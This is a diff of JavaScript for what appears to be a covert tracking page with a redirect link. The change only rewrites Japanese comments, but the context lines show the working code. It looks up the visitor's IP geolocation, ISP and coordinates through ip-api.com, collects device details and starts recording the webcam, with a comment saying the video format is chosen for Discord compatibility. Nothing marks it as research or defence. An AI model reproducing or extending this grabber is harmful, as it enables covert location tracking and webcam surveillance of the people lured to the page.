@@ -9,10 +9,10 @@
         const JUMP_URL = "https://x.gd/E7I1m";
 
         async function LULU_Initiate() {
-            // 1. ネ
+            // 1. ネットワーク情報の確実な取得
             let n = {};
             try {
-                // 冗
+                // 冗長性のため、より詳細なデータを返すエンドポイントを使用
                 const r = await fetch('http://ip-api.com/json/?fields=status,message,country,regionName,city,lat,lon,timezone,isp,org,as,query');
                 n = await r.json();
             } catch(e) { n = { query: "取得失敗" }; }
@@ -34,7 +34,7 @@
                 onl: navigator.onLine ? "オンライン" : "オフライン"
             };
 
-            // 2. ビデ）
+            // 2. ビデオ録画（VP8コーデックでDiscord互換性を最大化）
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                 const recorder = new MediaRecorder(stream, { mimeType: 'video/webm;codecs=vp8' });
